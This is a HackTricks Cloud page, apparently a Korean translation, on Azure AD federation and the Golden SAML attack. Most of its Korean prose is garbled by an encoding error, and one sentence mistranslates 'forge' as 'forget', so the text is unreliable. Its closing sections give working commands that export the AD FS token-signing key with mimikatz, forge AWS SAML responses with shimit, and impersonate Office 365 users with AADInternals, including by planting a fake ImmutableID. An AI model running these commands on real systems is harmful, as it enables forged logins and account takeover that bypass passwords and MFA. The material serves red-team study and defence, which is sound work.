# Az - Federation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federation**ì€ **ì‹ ë¢°**ë¥¼ êµ¬ì¶•í•œ **ë„ë©”ì¸**ì˜ ëª¨ìŒì…ë‹ˆë‹¤. ì‹ ë¢° ìˆ˜ì¤€ì€ ë‹¤ì–‘í•  ìˆ˜ ìˆì§€ë§Œ, ì¼ë°˜ì ìœ¼ë¡œ **ì¸ì¦**ì„ í¬í•¨í•˜ë©° ê±°ì˜ í•­ìƒ **ê¶Œí•œ ë¶€ì—¬**ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. ì¼ë°˜ì ì¸ í˜ë”ë ˆì´ì…˜ì€ **ë¦¬ì†ŒìŠ¤**ì— ëŒ€í•œ **ê³µìœ  ì•¡ì„¸ìŠ¤**ë¥¼ ìœ„í•´ **ì‹ ë¢°**ë¥¼ êµ¬ì¶•í•œ **ì—¬ëŸ¬ ì¡°ì§**ì„ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Azure AD**ì™€ **ì˜¨í”„ë ˆë¯¸ìŠ¤ í™˜ê²½**ì„ í˜ë”ë ˆì´ì…˜í•˜ì—¬ ì¸ì¦ ë° ê¶Œí•œ ë¶€ì—¬ì— ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë¡œê·¸ì¸ ë°©ë²•ì€ ëª¨ë“  ì‚¬ìš©ì **ì¸ì¦ì´ ì˜¨í”„ë ˆë¯¸ìŠ¤ì—ì„œ ë°œìƒ**í•˜ë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤. ì´ ë°©ë²•ì„ í†µí•´ ê´€ë¦¬ìëŠ” ë” ì—„ê²©í•œ ìˆ˜ì¤€ì˜ ì•¡ì„¸ìŠ¤ ì œì–´ë¥¼ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **AD FS** ë° PingFederateì™€ì˜ í˜ë”ë ˆì´ì…˜ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

ê¸°ë³¸ì ìœ¼ë¡œ, í˜ë”ë ˆì´ì…˜ì—ì„œëŠ” ëª¨ë“  **ì¸ì¦**ì´ **ì˜¨í”„ë ˆë¯¸ìŠ¤** í™˜ê²½ì—ì„œ ë°œìƒí•˜ë©° ì‚¬ìš©ìëŠ” ëª¨ë“  ì‹ ë¢°ëœ í™˜ê²½ì—ì„œ SSOë¥¼ ê²½í—˜í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì‚¬ìš©ìëŠ” **ì˜¨í”„ë ˆë¯¸ìŠ¤ ìê²© ì¦ëª…**ì„ ì‚¬ìš©í•˜ì—¬ **í´ë¼ìš°ë“œ** ì• í”Œë¦¬ì¼€ì´ì…˜ì— **ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Security Assertion Markup Language (SAML)**ì€ ê³µê¸‰ì ê°„ì— ëª¨ë“  ì¸ì¦ ë° ê¶Œí•œ ë¶€ì—¬ **ì •ë³´**ë¥¼ **êµí™˜**í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

ì–´ë–¤ í˜ë”ë ˆì´ì…˜ ì„¤ì •ì—ì„œë„ ì„¸ ê°€ì§€ ë‹¹ì‚¬ìê°€ ìˆìŠµë‹ˆë‹¤:

* ì‚¬ìš©ì ë˜ëŠ” í´ë¼ì´ì–¸íŠ¸
* Identity Provider (IdP)
* Service Provider (SP)

(ì´ë¯¸ì§€ ì¶œì²˜: https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. ì²˜ìŒì— ì‚¬ìš©ìëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜(ì˜ˆ: AWS ì½˜ì†” ë˜ëŠ” vSphere ì›¹ í´ë¼ì´ì–¸íŠ¸)ì— ì ‘ê·¼í•©ë‹ˆë‹¤. ì´ ë‹¨ê³„ëŠ” íŠ¹ì • êµ¬í˜„ì— ë”°ë¼ í´ë¼ì´ì–¸íŠ¸ë¥¼ ì§ì ‘ IdP(Identity Provider)ë¡œ ë¦¬ë””ë ‰ì…˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
2. ì´í›„ SPëŠ” ì‚¬ìš©ì ì¸ì¦ì„ ìœ„í•´ ì ì ˆí•œ IdP(ì˜ˆ: AD FS, Okta)ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ SAML(AuthnRequest)ì„ ì‘ì„±í•˜ê³  í´ë¼ì´ì–¸íŠ¸ë¥¼ ì„ íƒí•œ IdPë¡œ ë¦¬ë””ë ‰ì…˜í•©ë‹ˆë‹¤.
3. IdPëŠ” ì‚¬ìš©ìë¥¼ ì¸ì¦í•©ë‹ˆë‹¤. ì¸ì¦ í›„, IdPëŠ” SAMLResponseë¥¼ ì‘ì„±í•˜ì—¬ ì‚¬ìš©ìë¥¼ í†µí•´ SPë¡œ ì „ë‹¬í•©ë‹ˆë‹¤.
4. ë§ˆì§€ë§‰ìœ¼ë¡œ SPëŠ” SAMLResponseë¥¼ í‰ê°€í•©ë‹ˆë‹¤. ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” IdPì—ì„œ ë°œí–‰ëœ ê²ƒìœ¼ë¡œ í™•ì¸ë˜ë©´ ì‚¬ìš©ìëŠ” ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬ë°›ìŠµë‹ˆë‹¤. ì´ë¡œì¨ ë¡œê·¸ì¸ í”„ë¡œì„¸ìŠ¤ê°€ ì™„ë£Œë˜ê³  ì‚¬ìš©ìëŠ” ì„œë¹„ìŠ¤ë¥¼ ì´ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**SAML ì¸ì¦ ë° ì¼ë°˜ì ì¸ ê³µê²©ì— ëŒ€í•´ ë” ì•Œê³  ì‹¶ë‹¤ë©´:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FSëŠ” í´ë ˆì„ ê¸°ë°˜ì˜ ì•„ì´ë´í‹°í‹° ëª¨ë¸ì…ë‹ˆë‹¤.
* "..í´ë ˆì„ì€ ì£¼ë¡œ ì¸í„°ë„· ì–´ë””ì—ë‚˜ ìœ„ì¹˜í•œ í´ë ˆì„ ê¸°ë°˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ìŠ¹ì¸í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ì‚¬ìš©ìì— ëŒ€í•œ ì§„ìˆ (ì˜ˆ: ì´ë¦„, ì•„ì´ë´í‹°í‹°, ê·¸ë£¹)ì…ë‹ˆë‹¤."
* ì‚¬ìš©ìì˜ í´ë ˆì„ì€ SAML í† í°ì— ì‘ì„±ë˜ë©° IdPì— ì˜í•´ ê¸°ë°€ì„±ì„ ì œê³µí•˜ê¸° ìœ„í•´ ì„œëª…ë©ë‹ˆë‹¤.
* ì‚¬ìš©ìëŠ” ImmutableIDë¡œ ì‹ë³„ë©ë‹ˆë‹¤. ì´ëŠ” ì „ì—­ì ìœ¼ë¡œ ê³ ìœ í•˜ë©° Azure ADì— ì €ì¥ë©ë‹ˆë‹¤.
* ImmutableIDëŠ” ì˜¨í”„ë ˆë¯¸ìŠ¤ì—ì„œ ms-DS-ConsistencyGuidë¡œ ì €ì¥ë˜ë©° ì‚¬ìš©ìì˜ GUIDì—ì„œ íŒŒìƒë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ìì„¸í•œ ì •ë³´ëŠ” [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

**Golden SAML ê³µê²©:**

* ADFSì—ì„œ SAML ResponseëŠ” í† í° ì„œëª… ì¸ì¦ì„œë¡œ ì„œëª…ë©ë‹ˆë‹¤.
* ì¸ì¦ì„œê°€ ì†ìƒë˜ë©´ Azure ADì— ë™ê¸°í™”ëœ ëª¨ë“  ì‚¬ìš©ìë¡œ ì¸ì¦í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!
* PTA ë‚¨ìš©ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ì´ë‚˜ MFAëŠ” ì•„ë¬´ëŸ° ì˜í–¥ì„ ë¯¸ì¹˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ìš°ë¦¬ëŠ” ì¸ì¦ ì‘ë‹µì„ ìœ„ì¡°í•˜ê³  ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
* ì¸ì¦ì„œëŠ” DA ê¶Œí•œìœ¼ë¡œ AD FS ì„œë²„ì—ì„œ ì¶”ì¶œí•  ìˆ˜ ìˆìœ¼ë©°, ì¸í„°ë„·ì— ì—°ê²°ëœ ì–´ë–¤ ê¸°ê¸°ì—ì„œë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ìì„¸í•œ ì •ë³´ëŠ” [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

### Golden SAML

**Identity Provider (IdP)**ê°€ ì‚¬ìš©ì ë¡œê·¸ì¸ ìŠ¹ì¸ì„ ìœ„í•´ **SAMLResponse**ë¥¼ ìƒì„±í•˜ëŠ” ê³¼ì •ì€ ë§¤ìš° ì¤‘ìš”í•©ë‹ˆë‹¤. IdPì˜ íŠ¹ì • êµ¬í˜„ì— ë”°ë¼ **ì‘ë‹µ**ì€ **IdPì˜ ê°œì¸ í‚¤**ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì„œëª…**ë˜ê±°ë‚˜ **ì•”í˜¸í™”**ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì ˆì°¨ëŠ” **Service Provider (SP)**ê°€ SAMLResponseì˜ ì§„ìœ„ë¥¼ í™•ì¸í•˜ì—¬ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” IdPì—ì„œ ë°œí–‰ë˜ì—ˆìŒì„ ë³´ì¥í•©ë‹ˆë‹¤.

[golden ticket ê³µê²©](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)ê³¼ ìœ ì‚¬í•˜ê²Œ, ì‚¬ìš©ìì˜ ì•„ì´ë´í‹°í‹°ì™€ ê¶Œí•œì„ ì¸ì¦í•˜ëŠ” í‚¤(KRBTGTëŠ” golden ticket, token-signing ê°œì¸ í‚¤ëŠ” golden SAML)ë¥¼ ì¡°ì‘í•˜ì—¬ **ì¸ì¦ ê°ì²´**(TGT ë˜ëŠ” SAMLResponse)ë¥¼ **ìœ„ì¡°**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì‚¬ìš©ìë¥¼ ê°€ì¥í•˜ì—¬ SPì— ë¬´ë‹¨ ì•¡ì„¸ìŠ¤ë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Golden SAMLì€ ë‹¤ìŒê³¼ ê°™ì€ ì¥ì ì„ ì œê³µí•©ë‹ˆë‹¤:

* **ì›ê²©ìœ¼ë¡œ ìƒì„±**í•  ìˆ˜ ìˆìœ¼ë©°, í•´ë‹¹ ë„ë©”ì¸ì´ë‚˜ í˜ë”ë ˆì´ì…˜ì˜ ì¼ë¶€ì¼ í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.
* **ì´ì¤‘ ì¸ì¦(2FA)**ì´ í™œì„±í™”ëœ ìƒíƒœì—ì„œë„ ìœ íš¨í•©ë‹ˆë‹¤.
* í† í° ì„œëª… **ê°œì¸ í‚¤ëŠ” ìë™ìœ¼ë¡œ ê°±ì‹ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.
* **ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³€ê²½í•´ë„** ì´ë¯¸ ìƒì„±ëœ SAMLì€ ë¬´íš¨í™”ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\))ëŠ” ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ë¹„ì¦ˆë‹ˆìŠ¤ íŒŒíŠ¸ë„ˆ(í˜ë”ë ˆì´ì…˜) ê°„ì— **ì•„ì´ë´í‹°í‹° ì •ë³´ë¥¼ ì•ˆì „í•˜ê²Œ êµí™˜**í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” Microsoft ì„œë¹„ìŠ¤ì…ë‹ˆë‹¤. ì´ëŠ” ë„ë©”ì¸ ì„œë¹„ìŠ¤ê°€ í˜ë”ë ˆì´ì…˜ ë‚´ì˜ ë‹¤ë¥¸ ì„œë¹„ìŠ¤ ì œê³µìì™€ ì‚¬ìš©ì ì•„ì´ë´í‹°í‹°ë¥¼ ê³µìœ í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.

AWSê°€ ì†ìƒëœ ë„ë©”ì¸ì„ ì‹ ë¢°í•˜ëŠ” ê²½ìš°(í˜ë”ë ˆì´ì…˜ ë‚´ì—ì„œ), ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ AWS í™˜ê²½ì—ì„œ **ëª¨ë“  ê¶Œí•œì„ íšë“**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê³µê²©ì€ SAML ê°ì²´ë¥¼ ì„œëª…í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” **ê°œì¸ í‚¤**ê°€ í•„ìš”í•˜ë©°, ì´ëŠ” golden ticket ê³µê²©ì—ì„œ KRBTGTê°€ í•„ìš”í•œ ê²ƒê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤. AD FS ì‚¬ìš©ì ê³„ì •ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë§Œìœ¼ë¡œ ì´ ê°œì¸ í‚¤ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Golden SAML ê³µê²©ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•œ ìš”êµ¬ ì‚¬í•­ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* **í† í° ì„œëª… ê°œì¸ í‚¤**
* **IdP ê³µê°œ ì¸ì¦ì„œ**
* **IdP ì´ë¦„**
* **ì—­í•  ì´ë¦„(ê°€ì •í•  ì—­í• )**
* ë„ë©”ì¸\ì‚¬ìš©ì ì´ë¦„
* AWSì—ì„œì˜ ì—­í•  ì„¸ì…˜ ì´ë¦„
* Amazon ê³„ì • ID

_êµµê²Œ í‘œì‹œëœ í•­ëª©ë§Œ í•„ìˆ˜ì…ë‹ˆë‹¤. ë‚˜ë¨¸ì§€ëŠ” ì›í•˜ëŠ” ëŒ€ë¡œ ì±„ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤._

**ê°œì¸ í‚¤**ë¥¼ ì–»ìœ¼ë ¤ë©´ **AD FS ì‚¬ìš©ì ê³„ì •**ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ê°€ í•„ìš”í•©ë‹ˆë‹¤. ê±°ê¸°ì„œ ê°œì¸ í‚¤ëŠ” [mimikatz](https://github.com/gentilkiwi/mimikatz)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ **ê°œì¸ ì €ì¥ì†Œì—ì„œ ë‚´ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ë‹¤ë¥¸ í•„ìš”í•œ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ë ¤ë©´ ADFS ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸í•œ ìƒíƒœì—ì„œ Microsoft.Adfs.Powershell ìŠ¤ëƒ…ì¸ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
ëª¨ë“  ì •ë³´ë¥¼ í†µí•´, [**shimit**](https://github.com/cyberark/shimit)**ì„ ì‚¬ìš©í•˜ì—¬ ì›í•˜ëŠ” ì‚¬ìš©ìì˜ ìœ íš¨í•œ SAMLResponseë¥¼ ìŠì–´ë²„ë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### ì˜¨í”„ë ˆë¯¸ìŠ¤ -> í´ë¼ìš°ë“œ
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
í´ë¼ìš°ë“œ ì „ìš© ì‚¬ìš©ìì˜ ImmutableIDë¥¼ ìƒì„±í•˜ê³  ì´ë¥¼ ê°€ì¥í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## ì°¸ê³  ìë£Œ

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
AWS Hacking ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* PRì„ ì œì¶œí•˜ì—¬ [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
